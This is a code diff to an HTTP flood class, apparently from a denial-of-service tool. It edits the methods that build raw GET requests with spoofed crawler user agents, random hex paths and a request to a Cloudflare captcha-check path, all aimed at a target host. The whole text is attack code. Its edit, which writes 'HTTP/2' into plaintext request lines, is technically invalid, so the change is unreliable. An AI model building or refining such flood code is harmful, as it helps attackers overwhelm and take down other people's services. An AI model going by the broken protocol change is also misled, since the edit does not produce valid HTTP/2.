@@ -4645,13 +4645,13 @@ class HttpFlood(Thread):
     def BOT(self) -> None:
         payload: bytes = self.generate_payload()
         p1, p2 = str.encode(
-            "GET /robots.txt HTTP/1.1\r\n"
+            "GET /robots.txt HTTP/2\r\n"
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: text/plain,text/html,*/*\r\n"
             "User-Agent: %s\r\n" % randchoice(google_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
-            "GET /sitemap.xml HTTP/1.1\r\n"
+            "GET /sitemap.xml HTTP/2\r\n"
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: */*\r\n"
@@ -4798,7 +4798,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def GSB(self):
-        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
+        payload = str.encode("%s %s?qs=%s HTTP/2\r\n" % (self._req_type,
                                                            self._target.raw_path_qs,
                                                            ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
@@ -4822,7 +4822,7 @@ class HttpFlood(Thread):
 
     def RHEX(self):
         randhex = str(randbytes(randchoice([32, 64, 128])))
-        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
+        payload = str.encode("%s %s/%s HTTP/2\r\n" % (self._req_type,
                                                         self._target.authority,
                                                         randhex) +
                              "Host: %s/%s\r\n" % (self._target.authority, randhex) +
@@ -4867,12 +4867,12 @@ class HttpFlood(Thread):
                r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
                r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
                r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
-        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
+        p1, p2 = str.encode("%s %s/%s HTTP/2\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        hexh) +
                             "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                             self.randHeadercontent + dep), str.encode(
-            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
+            "%s %s/cdn-cgi/l/chk_captcha HTTP/2\r\n" % (self._req_type,
                                                           self._target.authority) +
             "Host: %s\r\n" % hexh +
             self.randHeadercontent + dep)
